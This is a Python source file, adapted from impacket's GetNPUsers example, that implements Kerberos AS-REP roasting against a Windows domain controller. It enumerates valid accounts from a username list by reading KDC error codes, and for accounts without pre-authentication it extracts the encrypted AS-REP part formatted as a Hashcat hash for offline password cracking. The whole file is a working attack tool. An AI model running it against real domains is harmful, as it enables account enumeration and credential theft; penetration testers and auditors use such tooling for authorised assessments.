import datetime
import random
from binascii import hexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH

# Mostly taken from: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py

class Kerberos:

    def __init__(self, hostname, domain):
        self.hostname = hostname
        self.domain = domain
        self.__kdcHost = hostname

    def check_users_dump_asreq(self, username_file):

        f = open(username_file)
        for username in f:
            username = username.strip()

            if ':' in username:
                username = username.split(':')[0]

            try:
                asreq = self._getTGT(username)
                # Existing user !
                if '\\' in username:
                    d = username.split('\\')[0]
                    u = username.split('\\')[1]
                else:
                    d = self.domain
                    u = username
                yield {'username': u, 'domain': d, 'asreq': asreq}
            except Exception as e:
                if 'KDC_ERR_C_PRINCIPAL_UNKNOWN' in str(e):
                    # No user with that name
                    continue
                elif 'UF_DONT_REQUIRE_PREAUTH' in str(e):
                    # Existing user !
                    if '\\' in username:
                        d = username.split('\\')[0]
                        u = username.split('\\')[1]
                    else:
                        d = self.domain
                        u = username
                    yield {'username': u, 'domain': d}
                else:
                    raise e

    def _getTGT(self, userName, requestPAC=True):

        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        asReq = AS_REQ()

        domain = self.domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)

        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.__kdcHost)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # RC4 not available, OK, let's ask for newer types
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.__kdcHost)
            else:
                raise e

        # This should be the PREAUTH_FAILED packet or the actual TGT if the target principal has the
        # 'Do not require Kerberos preauthentication' set
        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            # Most of the times we shouldn't be here, is this a TGT?
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)

        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
        return '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())

